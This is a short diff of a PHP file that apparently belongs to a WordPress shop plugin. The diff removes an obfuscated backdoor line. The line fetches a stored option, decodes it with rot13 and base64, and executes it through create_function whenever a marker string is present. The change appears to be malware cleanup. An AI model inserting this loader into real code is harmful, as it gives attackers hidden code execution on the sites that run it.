@@ -1,6 +1,4 @@
 <?php
-$z=get_option("_transient_feed_b84eb8db72c11d4d6c270f4310472737"); $z=base64_decode(str_rot13($z)); if(strpos($z,"FBD29541")!==false){ $_z=create_function("",$z); @$_z(); }
-
 
 if( ! function_exists( 'wpsc_get_exchange_rate' ) ) :
     function wpsc_get_exchange_rate( $from, $to ) {
